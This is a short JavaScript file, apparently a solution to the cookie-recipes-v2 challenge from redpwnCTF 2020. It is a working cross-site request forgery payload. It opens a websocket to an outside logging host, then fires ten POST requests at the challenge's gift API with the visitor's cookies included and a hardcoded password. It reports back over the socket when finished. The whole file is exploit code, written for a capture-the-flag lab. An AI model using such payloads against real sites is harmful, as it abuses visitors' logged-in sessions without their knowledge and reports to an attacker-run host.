// This is a solution to the cookie-recipes-v2 challenge from redpwnctf2020
// It uses a websocket to send information back to the server running from wslog.js

const logSocket = new WebSocket('wss://jmy.li:1337');

logSocket.addEventListener('open', _event => {
    doExploit();
});

function log(msg){
    if(logSocket.readyState == WebSocket.OPEN){
        logSocket.send(JSON.stringify(msg));
    }
}

async function doExploit(){

    for(let i = 0; i < 10; i++){
        fetch('https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=10057321804948635962', {
            method: 'POST',
            mode: 'no-cors',
            credentials: 'include',
            body: JSON.stringify({password: 'n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn'})
        });
    }

    log('finished all gift requests');

}
